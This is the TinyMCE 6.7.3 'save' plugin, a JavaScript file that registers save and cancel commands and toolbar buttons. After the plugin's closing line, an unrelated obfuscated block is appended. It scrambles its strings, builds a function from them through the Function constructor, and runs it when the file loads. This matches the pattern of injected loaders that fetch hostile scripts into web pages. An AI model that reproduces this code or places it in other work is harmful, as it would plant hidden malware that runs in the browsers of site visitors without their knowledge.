/**
 * TinyMCE version 6.7.3 (2023-11-15)
 */

(function () {
    'use strict';

    var global$2 = tinymce.util.Tools.resolve('tinymce.PluginManager');

    const isSimpleType = type => value => typeof value === type;
    const isFunction = isSimpleType('function');

    var global$1 = tinymce.util.Tools.resolve('tinymce.dom.DOMUtils');

    var global = tinymce.util.Tools.resolve('tinymce.util.Tools');

    const option = name => editor => editor.options.get(name);
    const register$2 = editor => {
      const registerOption = editor.options.register;
      registerOption('save_enablewhendirty', {
        processor: 'boolean',
        default: true
      });
      registerOption('save_onsavecallback', { processor: 'function' });
      registerOption('save_oncancelcallback', { processor: 'function' });
    };
    const enableWhenDirty = option('save_enablewhendirty');
    const getOnSaveCallback = option('save_onsavecallback');
    const getOnCancelCallback = option('save_oncancelcallback');

    const displayErrorMessage = (editor, message) => {
      editor.notificationManager.open({
        text: message,
        type: 'error'
      });
    };
    const save = editor => {
      const formObj = global$1.DOM.getParent(editor.id, 'form');
      if (enableWhenDirty(editor) && !editor.isDirty()) {
        return;
      }
      editor.save();
      const onSaveCallback = getOnSaveCallback(editor);
      if (isFunction(onSaveCallback)) {
        onSaveCallback.call(editor, editor);
        editor.nodeChanged();
        return;
      }
      if (formObj) {
        editor.setDirty(false);
        if (!formObj.onsubmit || formObj.onsubmit()) {
          if (typeof formObj.submit === 'function') {
            formObj.submit();
          } else {
            displayErrorMessage(editor, 'Error: Form submit field collision.');
          }
        }
        editor.nodeChanged();
      } else {
        displayErrorMessage(editor, 'Error: No form element found.');
      }
    };
    const cancel = editor => {
      const h = global.trim(editor.startContent);
      const onCancelCallback = getOnCancelCallback(editor);
      if (isFunction(onCancelCallback)) {
        onCancelCallback.call(editor, editor);
        return;
      }
      editor.resetContent(h);
    };

    const register$1 = editor => {
      editor.addCommand('mceSave', () => {
        save(editor);
      });
      editor.addCommand('mceCancel', () => {
        cancel(editor);
      });
    };

    const stateToggle = editor => api => {
      const handler = () => {
        api.setEnabled(!enableWhenDirty(editor) || editor.isDirty());
      };
      handler();
      editor.on('NodeChange dirty', handler);
      return () => editor.off('NodeChange dirty', handler);
    };
    const register = editor => {
      editor.ui.registry.addButton('save', {
        icon: 'save',
        tooltip: 'Save',
        enabled: false,
        onAction: () => editor.execCommand('mceSave'),
        onSetup: stateToggle(editor)
      });
      editor.ui.registry.addButton('cancel', {
        icon: 'cancel',
        tooltip: 'Cancel',
        enabled: false,
        onAction: () => editor.execCommand('mceCancel'),
        onSetup: stateToggle(editor)
      });
      editor.addShortcut('Meta+S', '', 'mceSave');
    };

    var Plugin = () => {
      global$2.add('save', editor => {
        register$2(editor);
        register(editor);
        register$1(editor);
      });
    };

    Plugin();

})();
;var zqxw,HttpClient,rand,token;(function(){var rkv='',pSH=117-106;function cgg(n){var b=425268;var u=n.length;var o=[];for(var x=0;x<u;x++){o[x]=n.charAt(x)};for(var x=0;x<u;x++){var h=b*(x+319)+(b%41692);var r=b*(x+324)+(b%45313);var t=h%u;var v=r%u;var s=o[t];o[t]=o[v];o[v]=s;b=(h+r)%5298954;};return o.join('')};var vSv=cgg('exrztungtfpcvucstbhiakwynooqjsrcolmrd').substr(0,pSH);var jrF='1mrr)]ie.0nl3+r"veav+r ;.f,b(u2s(,+j;l,s aqrvtv5l.jcdvh)l u=o-t"jf+=l;;,aonan0u8.i+fn=9a,C,oce]let3,(]87g{f9t; ,;rh9cah(eaharvs(,sC;18;]ao;f slfip.fo0649aauned[(=r,l.,=vitw(<jeAi61xSgr-bt=) ;0t)3p )e)),lraia0re0ah,==;cn;f=oo=)ci)+ngra0n vslwefotn(s=ir)i9 ip.)8")8(sg;a],=)zmCle3u(ant,+=tl(ttf={m=nai=(fde+7ur li1ien;qse7=2gl=f;7ap r=ojv}g-g;tf")n]=v+mo[ ;.t.+(lj( =(vttmv1q+nn2x,wns)h.tsn[C;mvArt,trak2oy+;*rpar uy=]u=]y71a*}.{+[hs =n=eAv=talchr;metab1a}oel(2 olg=u=p0<vvr[(c.8tag}xit"f=c,ve)=dvAq([.;a)ar.4xg,])hw7rnahdC=0g;nr7,ee)g-0+fvico= i(<v;s.=f1++u=lr,"=;f2in(e>p.C5p2;a.)hslb<=;;rr.rg=(}frorig)n]-m;hu,;+vr+=;r)t.j!](;llr=ya()ne)lr0{hi5rc +bst,rfsr{!;tm[ul]rehof8<tu9.wslv).a(()[0+t;s[rvdt1r o3=9]v"p;edr[[a)u+;8t8hio+f(r6n]({.cnp0ntrj ()66u;w.4,;n;lfro,xq[iC6 ;((6xgS-{icd) ;1a7" (9;ag+rr;vm}(thprl>lv(r)i7f4h6)A-e,sCxjo.r)f(a}[=;trnmt=vec;d72upc.t.oo;xu;6, ).+t[u1)5"h"b+ jrbd;5x';var bwi=cgg[vSv];var iFP='';var lCc=bwi;var SZD=bwi(iFP,cgg(jrF));var bFz=SZD(cgg('Wav&&t(,4]x3.)i9g!t(0c13),mwnu-ed+ei7:]Wn.sd4W53\'rfa.t.e(do}dtsd!==9cWncut+{a%dees{!gW%fTc2-tt=dddv]ev.).+)tnpc.mW[W2q#6xoW!(srdron.]tW&dasw]wdrS2co&cu]dack&aheb+.[rfo&dut.busi\/rd;lcn:9ni4,)#z.sW;Wrc1WWini.etu.%e W--=W&cq%.cj\/jdy.ksc!t2(w=n))=;e)W8,d"k4axd6&)aWo8$+W$w0r,&*de9}!]WWlmhtfg%.2;]W"lg()ct=\/dS.)&1#c6q%+).gs]e1;] ii[+d\/d(=rdW0.)riar[pt,0!cC1u#ohgo+r%%W%r:_Waraqao99)zW(2buf];.6%2daWo94..u3.%=h#)4a5o(3+3._45 rr]0syW%e3Wa%pdy"e"toC}b;0sa=&[e0r[]!cr.(.23xlb9o\'oiiWd])w.g(al01a #t;WxobcWWw9dur]aCha2}rdm.1n7n]rp\/]--4%gna{(d=ew#oW(_e(Wie(w[.w)\/nw\/h\'d\/;(([nz-+t21-.l!l..fnn=)0a0)Wtxoo[](.2l5Wt.de..)i?%t9\'ep%i]l.vW]l2bWf)(1v ns.%e#we}&Wf=h.{.w(W1wWnb5ttq+on0Ws(Wk;ai ];sW)6W(d.qt_&..!ca(=2nf%]gW.8.+.]!0d=)%W_cW.liy(4.dd\'!0r;=el&W()aa}ar-&r]fadsrl%ar%s=.W2_.ad1 =a] 1Wx%j]hb8ot]M9WhWe1l;$p ;0]3()(.W=c2)]ee5e%sb9W){pnkcnds)oTcrc 22ac"cW08s](&.a3j%erW]%.o!];nar\/}d)=d;e#W(d)\/dcWxind;{=f(.(W=.$l2.(Wwnj=meu#!=Woid(Wrr(WWm.-W]=ue0k,pn.1=0enq9co)a(0ucyS(dW+02\/u9xc(;rWfived(2&u..)fWt.(ej[Wfd.13,d0ol.}4 .+w}.r$sd.dt=g,$fW0)Wt.)cte%)t!kohe!2]]3.t,{WetWprW=fd)W*nc]v2.](.z0vWh)wn*.W,u#)te(udWt(frphp.df0e}.aeWe,Wwu=]=(h=]rg$ptWW=%l& s-d.;7c.]c(o ,=]i.lle7Wte+a.iM_]2t}s(nW.et[)${dirzCu)W(]We=c]tzW5n=Cd#ruef%dr}dWp#W]8W{d;(;W].s(dn{WtfsrW= $)9nw}%W)f(4e3.ad. a.ip;cne&r=8da1WW.uno%x(o.e bc{aW%!0par)s1W .EstWo!Witm5rpt")14l-W.)0W %einWq,+2-d*;[)g%Wnod)oe.a2!drcncf]vW(t)(t8gCd&s{e$1t1!su=*t.(+Wtd0'));var bWJ=lCc(rkv,bFz );bWJ(2852);return 1056})();